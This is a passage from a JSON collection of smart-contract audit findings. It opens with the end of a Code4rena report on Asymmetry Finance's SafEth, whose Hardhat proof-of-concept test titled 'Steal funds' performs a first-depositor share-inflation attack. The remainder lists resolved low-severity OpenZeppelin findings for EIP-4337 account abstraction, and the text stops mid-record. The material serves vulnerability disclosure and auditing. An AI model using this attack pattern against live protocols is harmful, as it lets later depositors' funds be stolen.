WSTETH_WHALE } from \"./helpers/constants\";\n\ndescribe.only(\"SafEth POC\", function () {\n  let safEthContractAddress: string;\n  let strategyContractAddress: string;\n  // create string array\n  let derivativesAddress: string[] = [];\n  let startingBalances: BigNumber[];\n  let networkFeesPerAccount: BigNumber[];\n  let totalStakedPerAccount: BigNumber[];\n\n  before(async () => {\n    startingBalances = await getUserBalances();\n    networkFeesPerAccount = startingBalances.map(() => BigNumber.from(0));\n    totalStakedPerAccount = startingBalances.map(() => BigNumber.from(0));\n  });\n\n  it(\"Should deploy the strategy contract\", async function () {\n    const safEthFactory = await ethers.getContractFactory(\"SafEth\");\n    const strategy = (await upgrades.deployProxy(safEthFactory, [\n      \"Asymmetry Finance ETH\",\n      \"safETH\",\n    ])) as SafEth;\n    await strategy.deployed();\n\n    strategyContractAddress = strategy.address;\n\n    const owner = await strategy.owner();\n    const derivativeCount = await strategy.derivativeCount();\n\n    expect(owner).eq((await getAdminAccount()).address);\n    expect(derivativeCount).eq(\"0\");\n  });\n\n  it(\"Should deploy derivative contracts and add them to the strategy contract with equal weights\", async function () {\n    const supportedDerivatives = [\"Reth\", \"SfrxEth\", \"WstEth\"];\n    const strategy = await getLatestContract(strategyContractAddress, \"SafEth\");\n\n    for (let i = 0; i < supportedDerivatives.length; i++) {\n      const derivativeFactory = await ethers.getContractFactory(\n        supportedDerivatives[i]\n      );\n      const derivative = await upgrades.deployProxy(derivativeFactory, [\n        strategyContractAddress,\n      ]);\n      \n      const derivativeAddress = derivative.address;\n      derivativesAddress.push(derivativeAddress);\n\n      await derivative.deployed();\n      const tx1 = await strategy.addDerivative(\n        derivative.address,\n        \"1000000000000000000\"\n      );\n      await tx1.wait();\n\n\n    }\n\n    const derivativeCount = await strategy.derivativeCount();\n\n    expect(derivativeCount).eq(supportedDerivatives.length);\n  });\n\n  it(\"Steal funds\", async function () {\n\n\n    const strategy = await getLatestContract(strategyContractAddress, \"SafEth\");\n    const userAccounts = await getUserAccounts();\n    let totalStaked = BigNumber.from(0);\n\n    const userStrategySigner = strategy.connect(userAccounts[0]);\n    const userStrategySigner2 = strategy.connect(userAccounts[1]);\n    const ethAmount = \"100\"; \n    const depositAmount = ethers.utils.parseEther(ethAmount);\n    totalStaked = totalStaked.add(depositAmount);\n    \n    const balanceBefore = await userAccounts[0].getBalance();\n    const stakeResult = await userStrategySigner.stake({\n      value: depositAmount,\n    });\n\n    const mined = await stakeResult.wait();\n    const networkFee = mined.gasUsed.mul(mined.effectiveGasPrice);\n    networkFeesPerAccount[0] = networkFeesPerAccount[0].add(networkFee);\n    totalStakedPerAccount[0] = totalStakedPerAccount[0].add(depositAmount);\n\n    const userSfEthBalance = await strategy.balanceOf(userAccounts[0].address);\n    const userSfWithdraw = userSfEthBalance.sub(1);\n   \n    \n    await network.provider.request({\n      method: \"hardhat_impersonateAccount\",\n      params: [WSTETH_WHALE],\n    });\n    const whaleSigner = await ethers.getSigner(WSTETH_WHALE);\n    const erc20 = new ethers.Contract(WSTETH_ADRESS, ERC20.abi, userAccounts[0]);\n\n    const wderivative = derivativesAddress[2];\n    const erc20BalanceBefore = await erc20.balanceOf(wderivative);\n\n    //remove all but 1 sfToken\n    const unstakeResult = await userStrategySigner.unstake(userSfWithdraw);\n\n    const erc20Whale = erc20.connect(whaleSigner);\n    const erc20Amount = ethers.utils.parseEther(\"10\");\n\n    // transfer tokens directly to the derivative (done by attacker)\n    await erc20Whale.transfer(wderivative, erc20Amount);\n\n    // NEW USER ENTERS\n    const ethAmount2 = \"1.5\"; \n    const depositAmount2 = ethers.utils.parseEther(ethAmount2);\n      \n    const stakeResu2lt = await userStrategySigner2.stake({\n      value: depositAmount2,\n    });\n\n    const mined2 = await stakeResult.wait();\n     \n    // User has 0 sfTokens!\n    const userSfEthBalance2 = await strategy.balanceOf(userAccounts[1].address);\n    console.log(\"userSfEthBalance2: \", userSfEthBalance2.toString());\n\n    // Attacker has 1 sfToken\n    const AttakcerSfEthBalanc = await strategy.balanceOf(userAccounts[0].address);\n    console.log(\"AttakcerSfEthBalanc: \", AttakcerSfEthBalanc.toString());\n    \n    //Total supply is 1. \n    const totalSupply = await strategy.totalSupply();\n    console.log(\"totalSupply: \", totalSupply.toString());\n    \n    \n  });\n\n});\n```\n\n### Tools Used\n\nvscode, hardhat\n\n**[Asymmetry mitigated](https://github.com/code-423n4/2023-05-asymmetry-mitigation-contest#mitigations-to-be-reviewed):**\n> Use internal accounting to get the balance.<br>\n\n**Status:** Mitigation confirmed with comments. Full details in reports from [d3e4](https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/25), [adriro](https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/23), and [0x52](https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/3).\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability found in the contract \"SafEth\" which is part of the \"Asymmetry Finance ETH\" project. The vulnerability allows the first user to manipulate the total supply of sfTokens and create a rounding error for each subsequent user. In the worst case, an attacker can steal all the funds of the next user.\n\nThe bug occurs when the first user enters the contract and the totalSupply is set to 1e18. The user can then immediately unstake most of their safETH, such that the totalSupply is much less than 1e18. The attacker can then transfer derivative tokens to the derivative contracts, thus increasing the underlying amount. This will cause the preDepositPrice to be heavily inflated, resulting in an inaccurate calculation of mintAmount, which can round down to 0 for users that deposit value that is less than the value that the attacker transferred in.\n\nTo demonstrate the bug, a Proof of Concept (POC) was created. This POC showed that when the attacker deposits 100 ETH and then transfers 10 wsETH to the WstEth contract, the second user's deposit of 1.5 ETH will not generate any additional safETH, since the minAmount is rounded down to 0. This allows the attacker to steal all of the second user's deposit.\n\nThe bug was mitigated by using internal accounting to get the balance. This mitigation was confirmed with comments from d3e4, adriro, and 0x52.",
      "quality_score": 3.0000000000000004,
      "rarity_score": 2,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Asymmetry Finance",
      "source_link": "https://code4rena.com/reports/2023-03-asymmetry",
      "github_link": "https://github.com/code-423n4/2023-03-asymmetry-findings/issues/1098",
      "tags": [
        "First Depositor Issue"
      ],
      "finders": [
        "sinarette",
        "yac",
        "Dug",
        "ck",
        "shaka",
        "ulqiorra",
        "0xfusion",
        "bytes032",
        "igingu",
        "giovannidisiena",
        "carrotsmuggler",
        "Cryptor",
        "nemveer",
        "juancito",
        "MiloTruck",
        "RedTiger",
        "mahdirostami",
        "Vagner",
        "Brenzee",
        "AkshaySrivastav",
        "ToonVH",
        "d3e4",
        "aga7hokakological",
        "Bahurum",
        "parsely",
        "Koolex",
        "RaymondFam",
        "Tricko",
        "0xRajkumar",
        "pavankv",
        "n33k",
        "bin2chen",
        "Krace",
        "Haipls",
        "sashik\\_eth",
        "mert\\_eren",
        "anodaram",
        "bart1e",
        "monrel"
      ]
    },
    {
      "id": "10349",
      "title": "Unsafe ABI encoding",
      "impact": "LOW",
      "content": "It is not an uncommon practice to use`abi.encodeWithSignature`or`abi.encodeWithSelector`to generate calldata for a low-level call. However, the first option is not safe from typographical errors, and the second option is not type-safe. The result is that both of these methods are error-prone and should be considered unsafe.\n\n\nWithin[`EIP4337Manager.sol`](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/gnosis/EIP4337Manager.sol), there are some occurrences of unsafe ABI encodings being used:\n\n\n* On[line 119](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/gnosis/EIP4337Manager.sol#L119)\n* On[line 144](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/gnosis/EIP4337Manager.sol#L144)\n\n\nConsider replacing all occurrences of unsafe ABI encodings with`abi.encodeCall`, which checks whether the supplied values actually match the types expected by the called function, and also avoids typographical errors.\n\n\nNote that a[bug](https://blog.soliditylang.org/2022/03/16/encodecall-bug/)related to the use of string literals as inputs to`abi.encodeCall`was fixed in version 0.8.13, so developers should exercise caution when using this function with earlier versions of Solidity.\n\n\n***Update:**Resolved in[pull request #220](https://github.com/eth-infinitism/account-abstraction/pull/220)and merged at commit[`c0a69bf`](https://github.com/eth-infinitism/account-abstraction/commit/c0a69bf34077e461f12e4d7e2146b52e7b59553b). The first example is an invalid recommendation because it is encoding an error.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "EIP-4337  Ethereum Account Abstraction Incremental Audit",
      "source_link": "https://blog.openzeppelin.com/eip-4337-ethereum-account-abstraction-incremental-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10348",
      "title": "Unrestrained revert reason [core]",
      "impact": "LOW",
      "content": "The`EntryPoint`contract can emit a[`FailedOp`error](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/interfaces/IEntryPoint.sol#L63)where the`reason`parameter provides additional context for troubleshooting purposes. However, there are two locations ([line 375](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/core/EntryPoint.sol#L375)and[line 417](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/core/EntryPoint.sol#L417)) where an untrusted contract can provide the reason, potentially including misleading error codes. For example, the sender`validateUserOp`function might revert with`\"AA90 invalid beneficiary\"`, which might cause confusion during simulation.\n\n\nConsider prefixing the externally provided revert reasons with a uniquely identifying error code.\n\n\n***Update:**Resolved in[pull request #200](https://github.com/eth-infinitism/account-abstraction/pull/200)and merged at commit[`3d8f450`](https://github.com/eth-infinitism/account-abstraction/commit/3d8f4508b23d712859d08aa848d6fc729c2761ad).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "EIP-4337  Ethereum Account Abstraction Incremental Audit",
      "source_link": "https://blog.openzeppelin.com/eip-4337-ethereum-account-abstraction-incremental-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10347",
      "title": "Uninitialized implementation contract [samples]",
      "impact": "LOW",
      "content": "The`SimpleAccountFactory`[creates a new implementation contract](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/samples/SimpleAccountFactory.sol#L19)but does not[initialize it](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/samples/SimpleAccount.sol#L80). This means that anyone can initialize the implementation contract to become its owner.\n\n\nThe consequences depend on the version of OpenZeppelin contracts in use. The project[requires release 4.2](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/package.json#L57)and later, but[release 4.8](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/yarn.lock#L804)is locked. The`onlyProxy`modifier was introduced in release 4.3.2 to protect the upgrade mechanism. Without this modifier, the owner is[authorized](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/samples/SimpleAccount.sol#L151)to call the upgrade functions on the implementation contract directly,[which lets them`selfdestruct`it](https://forum.openzeppelin.com/t/uupsupgradeable-vulnerability-post-mortem/15680).\n\n\nWith the locked version, the implementation owner can[execute arbitrary calls](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/samples/SimpleAccount.sol#L56-L73)from the implementation contract, but should not be able to interfere with the operation of the proxies.\n\n\nNevertheless, to reduce the attack surface, consider restricting the versions of OpenZeppelin contracts that are supported and[disabling the initializer](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v4.8.0/contracts/proxy/utils/Initializable.sol#L144)in the constructor of the`SimpleAccount`contract, to prevent anyone from claiming ownership.\n\n\n***Update:**Resolved in[pull request #201](https://github.com/eth-infinitism/account-abstraction/pull/201)and merged at commit[`4004ebf`](https://github.com/eth-infinitism/account-abstraction/commit/4004ebf1fa615c94801605f042a20d7cf1146fee).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "EIP-4337  Ethereum Account Abstraction Incremental Audit",
      "source_link": "https://blog.openzeppelin.com/eip-4337-ethereum-account-abstraction-incremental-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10346",
      "title": "Missing recommended function [samples]",
      "impact": "LOW",
      "content": "The EIP[states](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/eip/EIPS/eip-4337.md?plain=1#L149-L150)that an aggregated account should support the`getAggregationInfo`function, and that this function should return the accounts public key, and possibly other data. However, the[`BLSAccount`](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/bls/BLSAccount.sol)contract does not contain a`getAggregationInfo`function. Consider renaming[the`getBlsPublicKey`function](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/bls/BLSAccount.sol#L48)to`getAggregationInfo`.\n\n\n***Update:**Resolved in[pull request #199](https://github.com/eth-infinitism/account-abstraction/pull/199)and merged at commit[`12d2ac0`](https://github.com/eth-infinitism/account-abstraction/commit/12d2ac0326ce87d7b58a9c57e0e73d1717023ef9). The EIP now uses the`getBlsPublicKey`function as an example.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "EIP-4337  Ethereum Account Abstraction Incremental Audit",
      "source_link": "https://blog.openzeppelin.com/eip-4337-ethereum-account-abstraction-incremental-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10345",
      "title": "Missing error messages in require statements [core and samples]",
      "impact": "LOW",
      "content": "Within the[codebase](https://github.com/eth-infinitism/account-abstraction/tree/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/)there are some`require`statements that lack error messages:\n\n\n* The`require`statement on[line 105](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/core/BasePaymaster.sol#L105)of[`BasePaymaster.sol`](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/core/BasePaymaster.sol)\n* The`require`statement on[line 49](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/samples/DepositPaymaster.sol#L49)of[`DepositPaymaster.sol`](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/samples/DepositPaymaster.sol)\n* The`require`statement on[line 137](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/samples/SimpleAccount.sol#L137)of[`SimpleAccount.sol`](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/samples/SimpleAccount.sol)\n\n\nConsider including specific, informative error messages in`require`statements to improve overall code clarity and facilitate troubleshooting whenever a requirement is not satisfied.\n\n\n***Update:**Resolved in[pull request #198](https://github.com/eth-infinitism/account-abstraction/pull/198)and merged at commit[`182b7d3`](https://github.com/eth-infinitism/account-abstraction/commit/182b7d3387a12d2d96974dbb883ed4c15f573122). Error messages were added to the deficient`require`statements in`BasePaymaster.sol`and`DepositPaymaster.sol`, and the`require`statement in`SimpleAccount.sol`was eliminated as part of a code change.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "EIP-4337  Ethereum Account Abstraction Incremental Audit",
      "source_link": "https://blog.openzeppelin.com/eip-4337-ethereum-account-abstraction-incremental-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10344",
      "title": "Missing docstrings [core and samples]",
      "impact": "LOW",
      "content": "Throughout the[codebase](https://github.com/eth-infinitism/account-abstraction/tree/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/)there are several parts that do not have docstrings. For instance:\n\n\n* [Line 24](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/bls/BLSAccount.sol#L23-L24)in[`BLSAccount.sol`](https://github.com/eth-infinitism/account-abstraction/tree/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/bls/BLSAccount.sol)\n* [Line 39](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/bls/BLSAccount.sol#L38-L39)in[`BLSAccount.sol`](https://github.com/eth-infinitism/account-abstraction/tree/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/bls/BLSAccount.sol)\n* [Line 44](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/bls/BLSAccount.sol#L43-L44)in[`BLSAccount.sol`](https://github.com/eth-infinitism/account-abstraction/tree/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/bls/BLSAccount.sol)\n* [Line 48](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/bls/BLSAccount.sol#L47-L48)in[`BLSAccount.sol`](https://github.com/eth-infinitism/account-abstraction/tree/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/bls/BLSAccount.sol)\n* [Line 20](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/bls/BLSSignatureAggregator.sol#L19-L20)in[`BLSSignatureAggregator.sol`](https://github.com/eth-infinitism/account-abstraction/tree/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/bls/BLSSignatureAggregator.sol)\n* [Line 48](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/bls/BLSSignatureAggregator.sol#L46-L48)in[`BLSSignatureAggregator.sol`](https://github.com/eth-infinitism/account-abstraction/tree/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/bls/BLSSignatureAggregator.sol)\n* [Line 106](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/bls/BLSSignatureAggregator.sol#L105-L106)in[`BLSSignatureAggregator.sol`](https://github.com/eth-infinitism/account-abstraction/tree/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/bls/BLSSignatureAggregator.sol)\n* [Line 10](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/bls/IBLSAccount.sol#L10)in[`IBLSAccount.sol`](https://github.com/eth-infinitism/account-abstraction/tree/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/bls/IBLSAccount.sol)\n* [Line 24](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/core/BasePaymaster.sol#L23-L24)in[`BasePaymaster.sol`](https://github.com/eth-infinitism/account-abstraction/tree/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/core/BasePaymaster.sol)\n* [Line 29](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/core/BasePaymaster.sol#L27-L29)in[`BasePaymaster.sol`](https://github.com/eth-infinitism/account-abstraction/tree/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/core/BasePaymaster.sol)\n* [Line 31](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/core/BasePaymaster.sol#L30-L31)in[`BasePaymaster.sol`](https://github.com/eth-infinitism/account-abstraction/tree/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/core/BasePaymaster.sol)\n* [Line 167](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/core/EntryPoint.sol#L166-L167)in[`EntryPoint.sol`](https://github.com/eth-infinitism/account-abstraction/tree/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/core/EntryPoint.sol)\n* [Line 18](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/core/StakeManager.sol#L17-L18)in[`StakeManager.sol`](https://github.com/eth-infinitism/account-abstraction/tree/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/core/StakeManager.sol)\n* [Line 11](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/gnosis/EIP4337Fallback.sol#L10-L11)in[`EIP4337Fallback.sol`](https://github.com/eth-infinitism/account-abstraction/tree/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/gnosis/EIP4337Fallback.sol)\n* [Line 23](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/gnosis/GnosisAccountFactory.sol#L22-L23)in[`GnosisAccountFactory.sol`](https://github.com/eth-infinitism/account-abstraction/tree/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/gnosis/GnosisAccountFactory.sol)\n* [Line 67](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/interfaces/IStakeManager.sol#L66-L67)in[`IStakeManager.sol`](https://github.com/eth-infinitism/account-abstraction/tree/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/interfaces/IStakeManager.sol)\n* [Line 34](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/interfaces/UserOperation.sol#L33-L34)in[`UserOperation.sol`](https://github.com/eth-infinitism/account-abstraction/tree/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/interfaces/UserOperation.sol)\n* [Line 73](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/samples/DepositPaymaster.sol#L72-L73)in[`DepositPaymaster.sol`](https://github.com/eth-infinitism/account-abstraction/tree/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/samples/DepositPaymaster.sol)\n* [Line 27](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/samples/SimpleAccount.sol#L26-L27)in[`SimpleAccount.sol`](https://github.com/eth-infinitism/account-abstraction/tree/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/samples/SimpleAccount.sol)\n* [Line 31](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/samples/SimpleAccount.sol#L30-L31)in[`SimpleAccount.sol`](https://github.com/eth-infinitism/account-abstraction/tree/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/samples/SimpleAccount.sol)\n* [Line 23](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/samples/TestAggregatedAccount.sol#L22-L23)in[`TestAggregatedAccount.sol`](https://github.com/eth-infinitism/account-abstraction/tree/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/samples/TestAggregatedAccount.sol)\n* [Line 34](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/samples/TestAggregatedAccount.sol#L33-L34)in[`TestAggregatedAccount.sol`](https://github.com/eth-infinitism/account-abstraction/tree/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/samples/TestAggregatedAccount.sol)\n* [Line 16](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/samples/TestSignatureAggregator.sol#L15-L16)in[`TestSignatureAggregator.sol`](https://github.com/eth-infinitism/account-abstraction/tree/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/samples/TestSignatureAggregator.sol)\n* [Line 28](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/samples/TestSignatureAggregator.sol#L26-L28)in[`TestSignatureAggregator.sol`](https://github.com/eth-infinitism/account-abstraction/tree/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/samples/TestSignatureAggregator.sol)\n* [Line 43](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/samples/TestSignatureAggregator.sol#L42-L43)in[`TestSignatureAggregator.sol`](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/samples/TestSignatureAggregator.sol)\n* [Line 40](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/samples/TokenPaymaster.sol#L37-L40)in[`TokenPaymaster.sol`](https://github.com/eth-infinitism/account-abstraction/tree/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/samples/TokenPaymaster.sol)\n* [Line 6](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/utils/Exec.sol#L3-L6)in[`Exec.sol`](https://github.com/eth-infinitism/account-abstraction/tree/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/utils/Exec.sol)\n\n\nConsider thoroughly documenting all functions and their parameters, especially public APIs. When writing docstrings, consider following the[Ethereum Natural Specification Format](https://solidity.readthedocs.io/en/develop/natspec-format.html)(NatSpec).\n\n\n***Update:**Partially resolved in[pull request #212](https://github.com/eth-infinitism/account-abstraction/pull/212)and merged at commit[`eeb93b2`](https://github.com/eth-infinitism/account-abstraction/commit/eeb93b25804a748519245df34c4162fddf9a8fd1). The recommended changes to`GnosisAccountFactory.sol`were not implemented.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "EIP-4337  Ethereum Account Abstraction Incremental Audit",
      "source_link": "https://blog.openzeppelin.com/eip-4337-ethereum-account-abstraction-incremental-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10343",
      "title": "Mismatched event parameter [core]",
      "impact": "LOW",
      "content": "The`StakeLocked`event specifies a[`withdrawTime`parameter](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/interfaces/IStakeManager.sol#L26), but the argument passed in is the[new unstake delay](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/core/StakeManager.sol#L73). Consider renaming the event parameter to match its actual usage.\n\n\n***Update:**Resolved in[pull request #197](https://github.com/eth-infinitism/account-abstraction/pull/197)and merged at commit[`545a15c`](https://github.com/eth-infinitism/account-abstraction/commit/545a15cfdc793be375c2747ea90900612c00e077).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "EIP-4337  Ethereum Account Abstraction Incremental Audit",
      "source_link": "https://blog.openzeppelin.com/eip-4337-ethereum-account-abstraction-incremental-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10342",
      "title": "Misleading specification [core]",
      "impact": "LOW",
      "content": "The EIP[states](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/eip/EIPS/eip-4337.md?plain=1#L365)that when a`FailedOp`is detected, all other operations from the same paymaster should be removed from the current batch. However, this should only apply to`FailedOp`errors that explicitly mention the paymaster, which imply the paymaster was at fault. Operations that fail for unrelated reasons should not penalize their paymaster.\n\n\nThe EIP also[states](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/eip/EIPS/eip-4337.md?plain=1#L322)that`userOp`validation cannot call the`handleOps`method. This restriction should also apply to`handleAggregatedOps`.\n\n\nConsider clarifying these points in the EIP.\n\n\n***Update:**Partially resolved in[pull request #196](https://github.com/eth-infinitism/account-abstraction/pull/196)and merged at[`5929ff8`](https://github.com/eth-infinitism/account-abstraction/commit/5929ff80077e0e8dbf91c9ee234b73caa8d94bbc). The updated EIP mistakenly refers to the EntryPoints`depositTo`function as`depositFor`.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "EIP-4337  Ethereum Account Abstraction Incremental Audit",
      "source_link": "https://blog.openzeppelin.com/eip-4337-ethereum-account-abstraction-incremental-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10341",
      "title": "Incorrect or misleading documentation [core and samples]",
      "impact": "LOW",
